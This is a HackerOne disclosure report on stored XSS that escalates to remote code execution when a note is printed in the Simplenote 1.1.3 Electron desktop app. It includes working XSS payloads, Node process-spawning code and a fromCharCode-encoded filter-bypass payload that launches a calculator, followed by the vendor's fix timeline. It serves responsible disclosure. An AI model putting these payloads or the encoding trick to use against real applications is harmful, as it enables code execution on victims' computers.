---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
  - vuln/xss-stored
  - vuln/xss
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2018-07-26
submitted: 2018-05-27T09:33:36.011Z
bounty_usd: null
votes: 28
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "luigigubello"
source: "https://hackerone.com/reports/358049"
title: "RCE via Print function [Simplenote 1.1.3 - Desktop app] "
---
# RCE via Print function [Simplenote 1.1.3 - Desktop app] 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 28 | **Program:** Automattic | **Disclosed:** 2018-07-26

- Report: [https://hackerone.com/reports/358049](https://hackerone.com/reports/358049)
- CWE: Code Injection
- Submitted: 2018-05-27T09:33:36.011Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

In **Simplenote 1.1.3 - Desktop app** there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.

This report is based on the [report **#291539**](https://hackerone.com/reports/291539), by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.

# Step to reproduce

## 1 - Prerequisites

- Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)
- Markdown must **not** be enabled

## 2 - Stored XSS

Create a new note, and you write this text:
```
">'><details/open/ontoggle=confirm('XSS')>
```
Now go to **File** --> **Print**. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.

## 3 - From XSS to RCE

Thanks to [**ysx**] (https://hackerone.com/ysx), I used the code in his proof-of-concept.
The code to open the Gnome calculator in Debian is:

```
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

Now you use the functions `writeln()` and `String.fromCharCode()` to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:

```
">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>
```

You write it in a note, then you print it (or save like pdf). The Gnome calculator will open.

I have attached two screenshots and a proof-of-concept video.

## Impact

An attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **2018-05-27** @luigigubello: It is possible to use a shorter payload:
`<script>require('child_process').exec('/usr/bin/gnome-calculator',function(){})</script>`

Then you use `writeln()` and `String.FromCharcode()`. The final payload is:
`">'><details/open/ontoggle=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62))>`
- **2018-05-28** @roundhill: Thanks for the report @luigigubello! I remember noticing this a little while ago, but looks like a follow-up PR didn't happen to actually fix it. This report is a great reminder to get it fixed asap!

https://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892
- **2018-05-28** @luigigubello: Hi @roundhill 
I think you should fix. I did not know the topic on Github, but this vulnerability is an RCE. I hope you will fix this bug soon :) do you want to triage this report?
- **2018-05-28** @roundhill: Yes, working on it now. Thanks again.
- **2018-05-28** @luigigubello: Good work :)

Best  regards
- **2018-06-05** @luigigubello: Hi :)

Any news about the fix?
- **2018-06-14** @roundhill: Hi @luigigubello, the 1.1.4 update contains the fix for this issue. Can you please confirm?

Details here: https://github.com/Automattic/simplenote-electron/pull/766
- **Report Needs More Info**
- **Report New**
- **2018-06-15** @luigigubello: I tried to look at the source code, but I do not understand where the bug is. In [your fix](https://github.com/Automattic/simplenote-electron/commit/35c816eba4637282e0d0adddd696b3c3b142c69f) I read (*line 232-233*)
 ```
+              dangerouslySetInnerHTML={{
+                __html: renderNoteToHtml(content),
 ```

**renderNoteToHtml** is in these two files: [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/render-note-to-html.js) and [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/sanitize-html.js).

In **sanitize-html.js** there is the code:
 ```
      // only valid http(s) URLs are allowed
      if (('href' === name || 'src' === name) && validUrl.isWebUri(value)) {
        return false;
      }
 ```
So **href="javascript:alert(1)"** should not work. Indeed in the Preview it doesn't work, but it works in the print moment. Another strange thing: **href="javascript:alert(1)"** runs, but **href="javascript:write(1)"** does not seem to run.

I'm curious to understand the problem in the code.
Thank you.
- **2018-06-18** @luigigubello: Hi @roundhill , 

Do you confirm the bug?

Best regards
- **2018-06-18** @roundhill: Taking a look now, will get back to you soon.
- **2018-06-19** @roundhill: I've created a fix here, if you are curious about the details: https://github.com/Automattic/simplenote-electron/pull/771
- **2018-06-20** @luigigubello: Good, thanks @roundhill :)

When you want you can set the report like "Resolved"!
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
